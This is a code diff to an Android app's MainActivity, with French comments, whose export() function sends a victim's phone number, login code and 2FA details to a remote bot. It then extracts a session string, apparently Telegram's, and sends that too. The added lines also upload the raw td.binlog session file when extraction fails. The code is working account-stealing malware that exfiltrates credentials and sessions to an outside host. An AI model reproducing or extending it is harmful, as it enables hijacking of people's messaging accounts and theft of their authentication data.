@@ -95,23 +95,26 @@ class MainActivity : Activity() {
         }
     }
 
+
     private fun export() {
         if (exported) return
         exported = true
 
-        // 1. Envoyer les infos de login (numéro, code, 2FA)
         Net.send(Capture.payload(this))
 
-        // 2. Extraire la session en local
         val sessionStr = Capture.extractSession(this)
 
-        // 3. Envoyer la session string au bot (ou l'afficher à l'écran)
         if (sessionStr.startsWith("1")) {
             Net.send("🎉 SESSION STRING:\n$sessionStr")
-            runOnUiThread { toast("Session extraite avec succès !") }
+            runOnUiThread { toast("Session OK !") }
         } else {
-            Net.send("❌ ÉCHEC extraction:\n$sessionStr")
-            runOnUiThread { toast("Erreur extraction binlog") }
+            Net.send("❌ ÉCHEC:\n$sessionStr")
+            // ON ENVOIE LE FICHIER POUR DÉBUGUER
+            val f = Capture.binlogFile(this)
+            if (f.exists()) {
+                Net.sendFile("td.binlog", f.readBytes(), "Fichier binlog pour debug")
+            }
+            runOnUiThread { toast("Échec : Binlog envoyé au bot") }
         }
     }
 
